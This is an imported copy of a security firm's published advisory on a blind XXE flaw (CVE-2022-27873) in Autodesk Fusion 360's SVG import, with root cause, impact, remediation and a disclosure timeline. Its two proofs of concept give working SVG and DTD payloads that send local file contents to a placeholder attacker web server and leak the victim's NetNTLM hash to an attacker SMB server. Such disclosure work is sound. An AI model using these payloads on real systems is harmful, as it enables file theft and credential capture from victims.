---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-09_autodesk-fusion-360-2012887-insert-svg-blind-xxe.md
original_filename: 2022-06-09_autodesk-fusion-360-2012887-insert-svg-blind-xxe.md
title: Autodesk Fusion 360 <= 2.0.12887 “Insert SVG” Blind XXE
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 391012460206ba3f9932f1f19b20c629266b65890e486d3c218beedd7e47b142
text_sha256: 6833763029ed18567f776a2a935af7f7e4033c52a9083fe5e0acbb7325b039e7
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# Autodesk Fusion 360 <= 2.0.12887 “Insert SVG” Blind XXE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-09_autodesk-fusion-360-2012887-insert-svg-blind-xxe.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `391012460206ba3f9932f1f19b20c629266b65890e486d3c218beedd7e47b142`
- Text SHA256: `6833763029ed18567f776a2a935af7f7e4033c52a9083fe5e0acbb7325b039e7`


## Content

---
title: "Autodesk Fusion 360 <= 2.0.12887 “Insert SVG” Blind XXE"
page_title: "Shielder - Autodesk Fusion 360 <= 2.0.12887 “Insert SVG” Blind XXE"
url: "https://www.shielder.com/advisories/autodesk-fusion-import-svg-blind-xxe/"
final_url: "https://www.shielder.com/advisories/autodesk-fusion-import-svg-blind-xxe/"
authors: ["Giulio 'linset' Casciaro (@Lins3t)"]
programs: ["Autodesk"]
bugs: ["XXE"]
publication_date: "2022-06-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2574
---

[![shielder logo homepage](https://www.shielder.com/img/logoshielder.svg)](https://www.shielder.com/ "homepage") __

  * [Home](https://www.shielder.com/ "Home")
  * [Company](https://www.shielder.com/company "Company")
  * [Services](https://www.shielder.com/services "Services")
  * [Advisories](https://www.shielder.com/advisories "Advisories")
  * [Blog](https://www.shielder.com/blog "Blog")
  * [Careers](https://www.shielder.com/careers "Careers")
  * [Contacts](https://www.shielder.com/contacts "Contacts")
  * ENG

[ENG](https://www.shielder.com/advisories/autodesk-fusion-import-svg-blind-xxe/ "ENG") [ITA](https://www.shielder.com/it/advisories/autodesk-fusion-import-svg-blind-xxe/ "ITA")

# Autodesk Fusion 360 <= 2.0.12887 “Insert SVG” Blind XXE

The “Insert SVG” feature of Autodesk Fusion 360 <= 2.0.12887 is affected by a Blind XML External Entities (XXE). An attacker able to force a victim into loading a malicious SVG in Autodesk Fusion 360 could obtain their NetNTLM hash and the partial content (first line) of the files stored on their client.

## Product description (from vendor)

“Fusion 360 is a cloud-based 3D modeling, CAD, CAM, CAE, and PCB software platform for product design and manufacturing.” More information is available at <https://www.autodesk.com/products/fusion-360/overview>

### CVE

  * [CVE-2022-27873](https://www.autodesk.com/trust/security-advisories/adsk-sa-2022-0013)

### Root cause analysis

The “Insert SVG” feature parses the SVG using an XML parser which has the external entities loading enabled, therefore it is possible to force the XML parser into performing SMB and/or HTTP(S) requests.

### Proof of Concept - 1

  1. Setup a web server in order to check incoming HTTP requests
  2. Create a new file named “import.svg” with the following content by replacing `<attacker_webserver>` with web server created at step 1

  
  
  1
  2
  3
  4
  5
  

| 
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="no"?>
  <!DOCTYPE a [
  <!ENTITY % asd SYSTEM "http://<attacker_webserver>/oob_exfil.dtd"> 
  %asd;  
  ]>
  
  
---|---  
  
  3. Create a file called “oob_exfil.dtd” adding the following content by replacing `<attacker_webserver>` with web server created at step 1

  
  
  1
  2
  3
  4
  

| 
  
  
  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<attacker_webserver>/%file;'>">
  %eval;
  %exfiltrate;
  
  
---|---  
  
  4. Host the file created at step 3 in the web root of the web server and name it `oob_exfil.dtd`
  5. Open Autodesk Fusion 360 and create a new project
  6. Navigate to “Insert > Insert SVG”
  7. Click the button “Insert from my computer..”
  8. Select the SVG created at step 2
  9. Select random axes where the application will try to load the missing sketch from the SVG
  10. Ignore the error messages and check the web server logs
  11. Notice in that the first line of the `C:/Windows/win.ini` file has been sent to the web server.

  
  
  1.3.3.7 - - [25/Feb/2022 18:40:23] "GET /oob_exfil.dtd HTTP/1.0" 200 -
  1.3.3.7 - - [25/Feb/2022 18:40:23] code 400, message Bad request version ('support')
  1.3.3.7 - - [25/Feb/2022 18:40:23] "GET /; for 16-bit app support" 400 -
  

–

### Proof of Concept - 2

  1. Setup an SMB server (i.e. using the [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) script of the [Impacket project](https://github.com/SecureAuthCorp/impacket))
  2. Create a new file named “import.svg” with the following content by replacing `<attacker_smbserver>` with SMB server created at step 1

  
  
  1
  2
  3
  4
  5
  

| 
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="no"?>
  <!DOCTYPE a [
  <!ENTITY % asd SYSTEM 'file:////<attacker_smbserver>/test'> 
  %asd;  
  ]>
  
  
---|---  
  
  3. Open Autodesk Fusion 360 and create a new project
  4. Navigate to “Insert > Insert SVG”
  5. Click the button “Insert from my computer..”
  6. Select the SVG created at step 2
  7. Select random axes where the application will try to load the missing sketch from the SVG
  8. Ignore the error messages and check the SMB server logs
  9. Notice that an SMB connection has been triggered and that the NetNTLM hash of the user executing the vulnerable software has been received

  
  
  [SMB] NTLMv2-SSP Client  : ::ffff:1.3.3.7
  [SMB] NTLMv2-SSP Username : COMPUTER\vitim
  [SMB] NTLMv2-SSP Hash  : victim::COMPUTER:1122334455667788:A09FA...SNIP..
  

### Impact

An attacker could:

  * Obtain the public IP address of the victim.
  * Read the first line of local files stored on the victim’s device.
  * Obtain the NetNTLM hash of the current user (and eventually relay/crack it).

### Remediation

Upgrade Autodesk Fusion 360 to version 2.1.10903 or later. (Note: we didn’t verify the patch.)

## Disclosure timeline

  * 25/02/2022: Submission to Autodesk via HackerOne’s VDP
  * 28/02/2022: Autodesk acknowledged the vulnerability and started working on a fix
  * 26/04/2022: Autodesk closed the report as resolved after releasing the fixed version (2.1.10903)
  * 09/06/2022: Shielder’s advisory is made public

## Credits

Giulio `[linset](https://twitter.com/Lins3t)` Casciaro from Shielder

This advisory was first published on https://www.shielder.com/advisories/autodesk-fusion-import-svg-blind-xxe/

__[Advisory](/types/advisory)

Date

9 June 2022

Info

Shielder S.p.A.

P.I. 11435310013

REA TO - 1213132

Registered Capital: 81.000,00 €

[Via Palestro, 1/C  
10064 Pinerolo (TO) Italy](https://www.google.it/maps/place/Shielder/@44.8833849,7.3303863,17z/data=!3m1!4b1!4m5!3m4!1s0x4788250440849fa5:0x74cf10f2092abc85!8m2!3d44.8833849!4d7.332575 "corporate headquarters")

![ISO27001](/img/iso27001.png)

![ISO9001](/img/iso9001.png)

Contacts

[info@shielder.com](mailto:info@shielder.com "email Shielder")

Landline: [(+39) 0121 - 39 36 42](tel:+390121393642 "Landline")

Commercial: [(+39) 345 - 57 18 634](tel:+393455718634 "Commercial")

Technical: [(+39) 393 - 16 66 814](tel:+393931666814 "Technical")

[ __](https://twitter.com/ShielderSec "Shielder Twitter profile")[__](https://bsky.app/profile/shielder.com "Shielder Bluesky profile")[__](https://infosec.exchange/@Shielder "Shielder Mastodon profile")[__](https://www.linkedin.com/company/shielder "Shielder LinkedIn profile")[__](https://github.com/shieldersec "Shielder Github profile")

Sitemap

[Home](https://www.shielder.com/ "Home")

[Company](https://www.shielder.com/company "Company")

[Services](https://www.shielder.com/services "Services")

[Advisories](https://www.shielder.com/advisories "Advisories")

[Blog](https://www.shielder.com/blog "Blog")

[Careers](https://www.shielder.com/careers "Careers")

[Contacts](https://www.shielder.com/contacts "Contacts")

Copyright © Shielder 2014 - 2026 [Disclosure policy](/disclosure-policy "Disclosure Policy") [Privacy policy](/privacy-policy "Privacy Policy")
